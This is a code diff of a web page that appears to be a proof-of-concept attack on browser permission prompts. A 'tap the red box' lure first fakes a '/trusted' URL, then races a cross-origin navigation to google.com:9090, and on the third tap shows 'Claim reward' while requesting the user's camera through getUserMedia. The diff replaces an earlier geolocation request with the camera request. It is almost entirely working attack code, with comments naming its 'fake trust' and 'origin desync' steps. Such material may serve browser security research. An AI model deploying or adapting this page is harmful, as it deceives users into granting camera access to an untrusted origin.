@@ -31,6 +31,15 @@
     font-size:26px;
     text-align:center;
   }
+
+  video {
+    position:absolute;
+    bottom:20px;
+    left:50%;
+    transform:translateX(-50%);
+    width:240px;
+    border-radius:10px;
+  }
 </style>
 </head>
 
@@ -38,48 +47,53 @@
 
 <div id="redBox"></div>
 <div id="counter">Tap the red box 3×</div>
+<video id="cam" autoplay playsinline></video>
 
 <script>
 let clicks = 0;
 
 const box = document.getElementById("redBox");
 const counter = document.getElementById("counter");
+const cam = document.getElementById("cam");
 
-box.onclick = () => {
+box.onclick = async () => {
   clicks++;
   counter.textContent = "x" + clicks;
 
-  // 1️⃣ Fake trust / state change
+  // 1️⃣ Fake trust / visual state
   if (clicks === 1) {
     history.pushState({}, "", "/trusted");
     counter.textContent = "Nice! Keep tapping…";
   }
 
-  // 2️⃣ UI + navigation race
+  // 2️⃣ Navigation race (origin desync)
   if (clicks === 2) {
     counter.textContent = "Almost there…";
 
     requestAnimationFrame(() => {
       requestAnimationFrame(() => {
         setTimeout(() => {
-          // 🔥 External-looking navigation
+          // 🔥 Cross-origin navigation
           location.href = "https://google.com:9090";
         }, 70);
       });
     });
   }
 
-  // 3️⃣ Sensitive API call (context confusion)
+  // 3️⃣ Sensitive API — CAMERA
   if (clicks === 3) {
     counter.textContent = "Claim reward 🎁";
 
-    // Permission UI (iOS friendly)
-    if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(
-        pos => counter.textContent =
-          "Location: " + pos.coords.latitude,
-        () => counter.textContent = "Permission denied"
-      );
+    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video:true });
+        cam.srcObject = stream;
+        counter.textContent = "Camera access granted";
+      } catch (e) {
+        counter.textContent = "Camera permission denied";
+      }
+    } else {
+      counter.textContent = "Camera API not supported";
     }
   }
 };
